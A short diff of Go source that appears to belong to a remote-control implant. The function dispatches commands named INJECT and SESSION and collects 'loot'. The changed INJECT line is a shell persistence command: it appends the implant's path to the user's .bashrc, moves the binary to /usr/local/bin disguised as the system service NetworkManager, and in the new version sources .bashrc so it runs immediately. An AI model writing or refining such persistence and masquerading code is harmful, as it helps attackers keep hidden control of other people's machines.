@@ -18,7 +18,7 @@ func runCommand(command []string) Loot {
 	switch command[0] {
 	case "INJECT":
 		// TODO: Support zsh
-		const injectCommand string = "echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bashrc; mv ./NetworkManager /usr/local/bin/NetworkManager &"
+		const injectCommand string = "echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bashrc; mv ./NetworkManager /usr/local/bin/NetworkManager; source ~/.bashrc"
 		loot.Content = ExecuteCommand([]string{injectCommand})
 	case "SESSION":
 		go JoinSession()
